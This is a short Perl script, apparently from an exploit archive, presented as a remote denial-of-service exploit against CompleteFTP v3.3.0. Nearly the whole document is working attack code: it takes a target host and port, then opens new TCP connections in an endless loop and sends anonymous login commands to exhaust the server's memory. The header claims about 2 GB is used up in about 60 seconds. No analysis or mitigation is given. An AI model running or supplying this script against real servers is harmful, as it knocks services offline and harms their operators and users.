#!/usr/bin/perl
#
# Title:   CompleteFTP v3.3.0 - Remote Memory Consumption DoS
# Author:  Jonathan Salwan <submit(!)shell-storm.org>
# Web:     http://www.shell-storm.org
# 
# ~60 sec for satured ~2Go RAM
#

use IO::Socket;

print "\n[x]CompleteFTP v3.3.0 - Remote Memory Consumption DoS\n";

	if (@ARGV < 1)
		{
 		print "[-] Usage: <file.pl> <host> <port>\n";
 		print "[-] Exemple: file.pl 127.0.0.1 21\n\n";
 		exit;
		}

	$ip 	= $ARGV[0];
	$port 	= $ARGV[1];
	$login 	= "USER anonymous\r\n";
	$pwd 	= "PASS anonymous\r\n";

	$socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$ip", PeerPort => "$port") || die "[-] Connecting: Failed!\n";

	print "Please Wait...\n";

	while(){
		$socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$ip", PeerPort => "$port");
		$socket->recv($answer,2048);
		$socket->send($login);
		$socket->send($pwd);
		}
